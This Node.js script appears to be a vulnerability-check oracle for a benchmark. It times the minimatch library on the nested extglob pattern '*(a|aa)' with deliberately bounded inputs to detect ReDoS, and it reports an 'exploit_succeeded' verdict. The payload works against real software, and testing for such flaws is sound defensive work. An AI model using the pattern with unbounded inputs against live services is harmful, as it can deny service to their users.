const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function timeOne(input, pattern) {
  const t0 = nowMs();
  const out = minimatch(input, pattern);
  const dt = nowMs() - t0;
  return { out, ms: dt };
}

try {
  // Benign operation to validate API works.
  const benign = minimatch('readme.md', '*.md');
  if (benign !== true) {
    throw new Error('benign operation returned unexpected result');
  }

  operation_completed = true;

  // Bounded ReDoS probe for minimatch < patched versions.
  // Pattern with nested extglob alternation is known expensive in vulnerable versions.
  const pattern = '*(a|aa)';

  // Keep inputs bounded so script always finishes quickly.
  const smallInput = 'a'.repeat(24) + '!';
  const largeInput = 'a'.repeat(32) + '!';

  const small = timeOne(smallInput, pattern);
  const large = timeOne(largeInput, pattern);

  const smallMs = Math.max(small.ms, 0.001);
  const growth = large.ms / smallMs;
  const deltaMs = large.ms - small.ms;

  // Vulnerable behavior: superlinear blow-up between close sizes.
  // Patched behavior: much smaller growth.
  const growthThreshold = 8;
  const deltaThresholdMs = 25;

  exploit_succeeded = growth >= growthThreshold && deltaMs >= deltaThresholdMs;

  evidence = JSON.stringify({
    benign_ok: true,
    pattern,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_result: small.out,
    large_result: large.out,
    small_ms: Number(small.ms.toFixed(3)),
    large_ms: Number(large.ms.toFixed(3)),
    growth: Number(growth.toFixed(2)),
    delta_ms: Number(deltaMs.toFixed(3)),
    growth_threshold: growthThreshold,
    delta_threshold_ms: deltaThresholdMs,
    decision: exploit_succeeded ? 'redos_detected' : 'no_redos_detected'
  });
} catch (err) {
  if (operation_completed) {
    exploit_succeeded = false;
    evidence = JSON.stringify({
      benign_ok: true,
      malicious_error: err && err.message ? err.message : String(err),
      decision: 'blocked_by_exception'
    });
  } else {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed,
  exploit_succeeded,
  evidence
}));